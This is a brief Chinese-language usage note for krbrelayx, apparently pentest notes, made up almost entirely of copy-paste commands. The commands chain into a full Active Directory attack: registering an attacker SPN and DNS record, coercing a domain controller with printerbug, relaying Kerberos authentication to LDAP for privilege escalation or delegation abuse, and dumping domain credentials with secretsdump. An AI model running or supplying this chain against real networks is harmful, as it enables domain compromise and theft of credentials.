# krbrelayx 使用

krbrelayx 常用于 Kerberos 相关中继、委派和资源基约束委派场景的验证。实际使用前要先理清 DNS、SPN、机器账号和目标服务。

## 环境准备

```bash
python3 addspn.py -u domain.local/user -p pass -s HOST/attacker.domain.local attacker$
```

```bash
python3 dnstool.py -u domain.local/user -p pass -a add -r attacker -d 192.168.1.50 dc01.domain.local
```

```bash
python3 printerbug.py domain.local/user:pass@192.168.1.10 attacker.domain.local
```

## 中继监听

```bash
python3 krbrelayx.py -t ldap://dc01.domain.local --escalate-user attacker$
```

```bash
python3 krbrelayx.py -t ldap://dc01.domain.local --delegate-access
```

```bash
python3 krbrelayx.py --lootdir loot
```

## 票据使用

```bash
export KRB5CCNAME=./admin.ccache
```

```bash
secretsdump.py -k -no-pass dc01.domain.local
```

小记录：krbrelayx 相关操作依赖域内细节，失败时优先检查 DNS 解析、时间同步、SPN 和目标服务签名要求。
